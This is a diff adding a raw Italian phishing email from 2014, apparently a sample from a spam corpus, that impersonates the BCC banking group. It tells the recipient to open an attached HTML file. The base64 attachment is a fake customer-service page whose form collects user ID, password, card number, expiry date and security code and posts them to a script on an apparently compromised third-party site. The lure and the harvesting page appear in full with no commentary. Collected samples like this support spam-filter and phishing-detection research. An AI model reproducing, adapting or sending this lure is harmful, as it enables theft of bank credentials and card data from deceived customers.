@@ -1,0 +1,126 @@
+X-Account-Key: account2
+X-UIDL: 50ab8dc50005de0f
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+X-Mozilla-Keys:                                                                                 
+Return-Path: <info74955@bccsoar.it>
+X-Original-To: ianni@mat.unical.it
+Delivered-To: ianni@mat.unical.it
+Received: from localhost (ml [127.0.0.1])
+	by ml.mat.unical.it (Postfix) with ESMTP id 2F9A43568002
+	for <ianni@mat.unical.it>; Wed, 23 Jul 2014 10:42:45 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at mat.unical.it
+X-Spam-Flag: NO
+X-Spam-Score: 1.328
+X-Spam-Level: *
+X-Spam-Status: No, score=1.328 required=2.1 tests=[BAYES_00=-1.9,
+	DCC_CHECK=1.1, HTML_COMMENT_SAVED_URL=1.391, HTML_IMAGE_ONLY_32=0.001,
+	HTML_IMAGE_RATIO_06=0.001, HTML_MESSAGE=0.001, MIME_HTML_ONLY=0.723,
+	T_HTML_ATTACH=0.01, UNPARSEABLE_RELAY=0.001] autolearn=no
+Received: from ml.mat.unical.it ([127.0.0.1])
+	by localhost (ml.mat.unical.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id jiRdwUtGDW8N for <ianni@mat.unical.it>;
+	Wed, 23 Jul 2014 10:42:42 +0200 (CEST)
+Received: from netlink.it (kilonew.adbtech.it [193.33.99.246])
+	by ml.mat.unical.it (Postfix) with ESMTPS id 168A43568001
+	for <ianni@mat.unical.it>; Wed, 23 Jul 2014 10:42:42 +0200 (CEST)
+Received: (qmail 31423 invoked by uid 1004); 23 Jul 2014 08:51:43 -0000
+Received: from rev197-226.sferanet.pl (test@sistemistiindipendenti.org@rev197-226.sferanet.pl) by kilonew (envelope-from <info74955@bccsoar.it>, uid 0) with qmail-scanner-2.06st 
+ (clamdscan: 0.94.2/9356. spamassassin: 3.2.5. perlscan: 2.06st.  
+ Clear:RC:1(91.192.197.226):. 
+ Processed in 0.060971 secs); 23 Jul 2014 08:51:43 -0000
+Received: from rev197-226.sferanet.pl (HELO bccsoar.it) (test@sistemistiindipendenti.org@91.192.197.226)
+  by  with ESMTPA; 23 Jul 2014 08:51:43 -0000
+From: BCC<info7577@bccsoar.it>
+To: ianni@mat.unical.it
+Subject: e disponibile il Suo estratto conto 702273677
+Date: 23 Jul 2014 10:42:40 +0200
+Message-ID: <20140723104240.0A1F2FD8BB3F9FD9@bccsoar.it>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_B14B44DF.144237FC"
+Status:   
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_B14B44DF.144237FC
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 8.00.6001.19518"></HEAD>
+<BODY><FONT face=3D"Courier New">Gentile Cliente,<BR><BR>Vi informiamo che =
+=E8 disponibile on-line il Suo estratto conto (riferito al codice del rappor=
+to 4377-425408)<BR>potr=E0 consultarlo, stamparlo e salvarlo sul Suo PC per =
+creare un Suo archivio personalizzato.<BR>La ricordiamo che ogni estratto co=
+nto rimane in linea fino al terzo mese successivo all'emissione.<BR>Si prega=
+ di scaricare il file allegato a questa email.<BR><BR>
+Grazie ancora per aver scelto i servizi on-line.<BR>Cordiali saluti,<BR>Serv=
+izio Clienti Gruppo BCC.</FONT></BODY></HTML>
+------=_NextPart_000_0012_B14B44DF.144237FC
+Content-Type: text/html; name="assistenza_clienti.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="assistenza_clienti.html"
+
+PCEtLSBzYXZlZCBmcm9tIHVybD0oMDAxNilodHRwOi8vbG9jYWxob3N0IC0tPg0KPGh0bWw+
+PGhlYWQ+PHRpdGxlPjo6Ojo6IFNlcnZpemlvIENsaWVudGkgOjo6Ojo8L3RpdGxlPg0KPGJh
+c2UgaHJlZj0iaHR0cDovL2NvbXVuZS5wb3p6b2xlbmdvLmJzLml0L3Jlcy8iIC8+DQo8bGlu
+ayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9mYXN0YmFuay5jc3MiIHR5cGU9InRleHQv
+Y3NzIj4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9o
+dG1sOyBjaGFyc2V0PXV0Zi04Ij4NCjxzY3JpcHQgc3JjPSJqcy9tcGVzYS5qcyIgdHlwZT0i
+dGV4dC9qYXZhc2NyaXB0IiBsYW5ndWFnZT0iamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQo8L2hl
+YWQ+PGJvZHk+DQo8dGFibGUgYWxpZ249ImNlbnRlciIgYm9yZGVyPSIwIiBjZWxscGFkZGlu
+Zz0iMCIgY2VsbHNwYWNpbmc9IjAiPg0KPHRib2R5Pjx0cj4NCgk8dGQgdmFsaWduPSJtaWRk
+bGUiPg0KCQk8ZGl2IHN0eWxlPSJjb2xvcjogI0ZGMzMwMDsgZm9udC1mYW1pbHk6IEFyaWFs
+LCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7IGZvbnQtc2l6ZTogMzBweDsgdGV4dC1hbGlnbjog
+Y2VudGVyOyI+U2Vydml6aW8gQ2xpZW50aTwvZGl2Pg0KCQkJPHRhYmxlIGFsaWduPSJjZW50
+ZXIiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4NCgkJCTx0
+Ym9keT4NCgkJCTx0cj4NCgkJCQk8dGQgcm93c3Bhbj0iMiIgdmFsaWduPSJ0b3AiPjxicj48
+aW1nIHNyYz0iaW1nL2xlZnRfYmFyX21hcmNoZS5naWYiIHdpZHRoPSI1NSIgaGVpZ2h0PSIy
+NDIiPjwvdGQ+DQoJCQkJPHRkIGNvbHNwYW49IjIiIHZhbGlnbj0idG9wIj48YnI+PGltZyBz
+cmM9ImltZy90b3BfYmFyX2dpYWxsby5naWYiIHdpZHRoPSI1NDAiIGhlaWdodD0iNyI+PC90
+ZD4NCgkJCTwvdHI+DQoJCQk8dHI+DQoJCQkJPHRkPg0KCQkJCQk8IS0tIFRBQkVMTEEgSU5U
+RVJOQSAtLT4NCgkJCQkJPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMCIgY2VsbHBh
+ZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0iODAlIj4NCgkJCQkJPGZvcm0gbWV0
+aG9kPSJwb3N0IiBuYW1lPSJub2lhIiBvbnN1Ym1pdD0icmV0dXJuIHBhcmEoKSIgYWN0aW9u
+PSJpbnZpYS5waHAiIGVuY3R5cGU9ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2Rl
+ZCI+DQoJCQkJCTx0Ym9keT4NCgkJCQkJPHRyPg0KCQkJCQkJPHRkIGNvbHNwYW49IjIiIGFs
+aWduPSJjZW50ZXIiPg0KCQkJCQkJCTwhLS0gVEFCRUxMQSBWQUxPUkkgLyBSSVNVTFRBVEkg
+LS0+DQoJCQkJCQkJPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMCIgY2VsbHBhZGRp
+bmc9IjAiIGNlbGxzcGFjaW5nPSIyIiB3aWR0aD0iOTAlIj4NCgkJCQkJCQk8dGJvZHk+DQoJ
+CQkJCQkJPHRyPg0KCQkJCQkJCQk8dGQgY29sc3Bhbj0iMiI+DQoJCQkJCQkJCTwvdGQ+DQoJ
+CQkJCQkJPC90cj4NCgkJCQkJCQk8dHI+DQoJCQkJCQkJCTx0ZD48c3BhbiBjbGFzcz0iY29y
+cG9fYm9sZCI+VXNlciBJRDo8L3NwYW4+PC90ZD4NCgkJCQkJCQkJPHRkPjxzcGFuIGNsYXNz
+PSJjb3JwbyI+PGlucHV0IG5hbWU9InVzZXJuYW1lIiBzaXplPSIyMyIgdHlwZT0idGV4dCI+
+PC9zcGFuPjwvdGQ+DQoJCQkJCQkJPC90cj4NCgkJCQkJCQk8dHI+DQoJCQkJCQkJCTx0ZD48
+c3BhbiBjbGFzcz0iY29ycG9fYm9sZCI+UGFzc3dvcmQ6PC9zcGFuPjwvdGQ+DQoJCQkJCQkJ
+CTx0ZD48c3BhbiBjbGFzcz0iY29ycG8iPjxpbnB1dCBuYW1lPSJwYXNzd29yZCIgc2l6ZT0i
+MjMiIHR5cGU9InBhc3N3b3JkIj48L3NwYW4+PC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJ
+CTx0cj4NCgkJCQkJCQkJPHRkIGNvbHNwYW49IjIiPiZuYnNwOzwvdGQ+DQoJCQkJCQkJPC90
+cj4NCgkJCQkJCQk8dHI+DQoJCQkJCQkJCTx0ZD48c3BhbiBjbGFzcz0iY29ycG9fYm9sZCI+
+TnVtZXJvIGRlbGxhIENhcnRhOjwvc3Bhbj48L3RkPg0KCQkJCQkJCQk8dGQ+PHNwYW4gY2xh
+c3M9ImNvcnBvIj48aW5wdXQgbmFtZT0ibmNhcnRhIiBzaXplPSIyMCIgbWF4bGVuZ3RoPSIx
+NiIgdHlwZT0idGV4dCI+PC9zcGFuPjwvdGQ+DQoJCQkJCQkJPC90cj4NCgkJCQkJCQk8dHI+
+DQoJCQkJCQkJCTx0ZD48c3BhbiBjbGFzcz0iY29ycG9fYm9sZCI+RGF0YSBkaSBzY2FkZW56
+YTo8L3NwYW4+PC90ZD4NCgkJCQkJCQkJPHRkPg0KCQkJCQkJCQkJPHNwYW4gY2xhc3M9ImNv
+cnBvIj48aW5wdXQgbmFtZT0iZXhwbSIgc2l6ZT0iNCIgbWF4bGVuZ3RoPSIyIiB0eXBlPSJ0
+ZXh0Ij4NCgkJCQkJCQkJCSZuYnNwOy8mbmJzcDsmbmJzcDsNCgkJCQkJCQkJCTxpbnB1dCBu
+YW1lPSJleHBhIiBzaXplPSI0IiBtYXhsZW5ndGg9IjQiIHR5cGU9InRleHQiPjwvc3Bhbj4N
+CgkJCQkJCQkJPC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJCTx0cj4NCgkJCQkJCQkJPHRk
+PjxzcGFuIGNsYXNzPSJjb3Jwb19ib2xkIj5Db2RpY2UgZGkgc2ljdXJlenphOjwvc3Bhbj48
+L3RkPg0KCQkJCQkJCQk8dGQ+PHNwYW4gY2xhc3M9ImNvcnBvIj48aW5wdXQgbmFtZT0iY3Nj
+IiBzaXplPSIzIiBtYXhsZW5ndGg9IjMiIHR5cGU9InRleHQiPjwvc3Bhbj48L3RkPg0KCQkJ
+CQkJCTwvdHI+DQoJCQkJCQkJPHRyPg0KCQkJCQkJCQk8dGQgY29sc3Bhbj0iMiI+Jm5ic3A7
+PC90ZD4NCgkJCQkJCQk8L3RyPg0KCQkJCQkJCTwvdGJvZHk+DQoJCQkJCQkJPC90YWJsZT4N
+CgkJCQkJCTwvdGQ+DQoJCQkJCTwvdHI+DQoJCQkJCTx0cj4NCgkJCQkJCTx0ZCBhbGlnbj0i
+Y2VudGVyIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iIiBjbGFzcz0iYnV0dG9uX2Fk
+ZCI+PC90ZD4NCgkJCQkJPC90cj4NCgkJCQkJPC9mb3JtPg0KCQkJCQk8L3Rib2R5Pg0KCQkJ
+CQk8L3RhYmxlPg0KCQkJCTwvdGQ+DQoJCQkJPHRkIGFsaWduPSJyaWdodCIgdmFsaWduPSJi
+b3R0b20iPjxpbWcgc3JjPSJpbWcvc2VwYXJhdG9yX3NtYWxsX2dpYWxsby5naWYiIHdpZHRo
+PSI3IiBoZWlnaHQ9IjIzMyI+PC90ZD4NCgkJCTwvdHI+DQoJCQk8L3Rib2R5Pg0KCQkJPC90
+YWJsZT4NCgk8L3RkPg0KPC90cj4NCjwvdGJvZHk+DQo8L3RhYmxlPg0KPC9ib2R5Pg0KPC9o
+dG1sPg==
+
+------=_NextPart_000_0012_B14B44DF.144237FC--
+
